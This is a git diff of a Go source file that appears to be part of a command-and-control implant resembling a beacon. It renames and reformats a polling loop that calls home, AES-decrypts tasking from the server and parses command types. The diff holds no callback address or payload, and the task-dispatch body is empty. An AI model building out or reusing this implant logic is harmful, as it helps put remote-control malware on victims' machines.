@@ -35,42 +35,51 @@ func Init() error {
 
 	log.Printf("firstblood ok")
 	time.Sleep(time.Duration(config.SLEP))
-	return loop(enc, mt, &req)
+	return handler(enc, mt, &req)
 }
 
-
-func loop(enc *encrypt.Enc, mt *metadata.Metadata, r *requester.ReqProfile) error {
+/*
+handler handles the communication.
+*/
+func handler(enc *encrypt.Enc, mt *metadata.Metadata, r *requester.ReqProfile) error {
 	for {
-		resp, err := callCommand(mt, r)
+		resp, err := callTask(mt, r)
 		if err != nil {
 			return err
 		}
 		//log.Printf("call home ok st=%d cl=%d\n", resp.StatusCode, resp.ContentLength)
-		
+
 		if resp.ContentLength > 0 {
 			body, err := io.ReadAll(resp.Body)
-			if err != nil {return err}
+			if err != nil {
+				return err
+			}
 
 			//hmacData := body[resp.ContentLength-encrypt.HmacHashLen:]
 			data := body[:resp.ContentLength-encrypt.HmacHashLen]
-			decData, err := enc.AesCBCDecrypt(data, enc.AesKey)
-			if err != nil {return err}
-			
-			timestamp := decData[:4]
-			lenDataB := decData[4:8]
+			tasks, err := enc.AesCBCDecrypt(data, enc.AesKey)
+			if err != nil {
+				return err
+			}
+
+			timestamp := tasks[:4]
+			lenDataB := tasks[4:8]
 			lenData := binary.BigEndian.Uint32(lenDataB)
-			decBuf := bytes.NewBuffer(decData[8:])
+			tasksBuf := bytes.NewBuffer(tasks[8:])
 
 			for {
-				if lenData <= 0 {break}
-				cmdType, data, err := metadata.ParseCmd(decBuf, &lenData)
-				if err != nil {return err}
-
+				if lenData <= 0 {
+					break
+				}
+				cmdType, data, err := metadata.ParseTask(tasksBuf, &lenData)
+				if err != nil {
+					return err
+				}
+				
 			}
 
 		}
-		
-		
+
 		time.Sleep(time.Duration(config.SLEP) * time.Millisecond)
 	}
 }
